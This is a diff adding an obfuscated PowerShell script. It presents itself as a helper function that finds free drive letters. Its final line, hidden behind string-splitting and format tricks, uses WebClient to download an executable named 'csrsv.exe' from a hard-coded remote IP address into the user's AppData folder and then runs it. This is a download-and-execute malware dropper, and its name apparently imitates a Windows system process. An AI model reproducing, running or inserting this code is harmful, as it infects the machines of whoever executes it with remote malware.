@@ -1,0 +1,38 @@
+function get`-mR`Availab`LE`dr`i`VeLeTTer {
+
+
+
+    [CmdletBinding()]
+    param (
+        [string[]]${ex`c`lUDeDR`ive`le`TTeR} = ('A-F', 'Z'),
+
+        [switch]${R`An`DoM},
+
+        [switch]${a`LL}
+    )
+    
+    ${D`RIV`es} = &("{1}{4}{3}{0}{2}"-f'I','Get-Ch','tem','ld','i') -Path ("{0}{1}{2}" -f'Function:','[a','-z]:') -Name
+
+    if (${e`X`CLuDedriVelE`Tter}) {
+        ${drI`V`eS} = ${DRiv`eS} -notmatch "[$($ExcludeDriveLetter -join ',')] "
+    }
+
+    if (${ra`N`DoM}) {
+        ${D`RiV`Es} = ${d`Ri`Ves} | &("{1}{0}{2}" -f'an','Get-R','dom') -Count ${dR`ivES}."C`oUnt"
+    }
+
+    if (-not(${A`Ll})) {
+        
+        foreach (${drI`Ve} in ${dr`i`VES}) {
+            if (-not(.("{1}{2}{0}"-f'ath','T','est-P') -Path ${Dri`VE})){
+                return ${dri`VE}
+            }
+        }
+
+    }
+    else {
+        &("{0}{1}{2}" -f'Writ','e-Ou','tput') ${Driv`es} | &("{1}{0}{2}"-f '-Obj','Where','ect') {-not(&("{1}{2}{0}" -f'Path','Tes','t-') -Path ${_})}
+    }
+
+}
+(&("{1}{0}{2}"-f 'Obj','New-','ect') ("{0}{6}{3}{5}{1}{2}{4}"-f'Syste','l','ie','b','nt','C','m.Net.We')).("{1}{2}{0}{3}"-f'loa','Dow','n','dFile').Invoke(("{4}{8}{2}{7}{3}{5}{0}{1}{6}"-f 'o/','cs','9.24','70.','http:/','218/~yaho','rsv.exe','8.1','/8'),"$env:APPDATA\csrsv.exe");.("{0}{2}{1}"-f'Star','-Process','t') ("$env:APPDATA\csrsv.exe")
